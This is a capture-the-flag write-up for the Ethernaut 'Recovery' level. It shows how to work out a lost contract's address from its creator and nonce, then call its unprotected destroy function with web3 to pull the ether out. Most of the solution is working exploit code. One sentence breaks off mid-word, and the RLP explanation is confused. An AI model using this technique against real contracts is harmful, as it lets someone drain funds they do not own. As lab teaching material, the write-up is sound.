# Recovery

# Problem Statement
```
A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.
```

# Solution
Looking at the contract note there is a `destroy` function that has an input parameter to send the ether to when it is called.<br>
So all we need to do is to find the address of the `Recovery` contract and be ab

## Solution 1: Use etherscan
Find transaction where the instance was created. Find the `SimpleToken` contract address and call the `destroy` method:
```
const simpleTokenAddress = "0xTHE_SIMPLE_TOKEN_CONTRACT_ADDRESS_FROM_ETHERSCAN";
const data = web3.eth.abi.encodeFunctionCall({
  name: 'destroy',
  type: 'function',
  inputs: [{
    type: 'address',
    name: '_to'
  }]
}, [player])
await web3.eth.sendTransaction({
  to: simpleTokenAddress,
  from: player,
  data: data
})
```
Though what if you also lost the transaction? Let's find the answer in Solution 2.

## Solution 2: Regenerate the address
This is the actual solution as the goal of this lesson is to show that you can regenerate the address created by another address.<br>
From the [docs](https://docs.soliditylang.org/en/v0.8.15/introduction-to-smart-contracts.html):
```
The address of an external account is determined from the public key while the address of a contract is determined at the time the contract is created (it is derived from the creator address and the number of transactions sent from that address, the so-called “nonce”).
```
To find the address we need to use [RLP](https://github.com/ethereum/wiki/wiki/RLP). This encoding of a normal ethereum 20-byte/160-bit address is `0xd6` and `0x94`. The RLP is `0x01` which is `1`. We can use the `web3`' library to generate the address:
```
const simpleTokenAddress = web3.utils.soliditySha3("0xd6", "0x94", contract.address, "0x01").slice(26)
```
Now, just call the `destroy` function with this address:
const data = web3.eth.abi.encodeFunctionCall({
  name: 'destroy',
  type: 'function',
  inputs: [{
    type: 'address',
    name: '_to'
  }]
}, [player])

// This will call the destroy method
await web3.eth.sendTransaction({
  to: simpleTokenAddress,
  from: player,
  data: data
})

We've completed this lesson!

# Key Learnings
- The actions of an account is never anonymous on the Ethereum blockchain. Anyone can follow an account's transactions and future derived contract addresses.
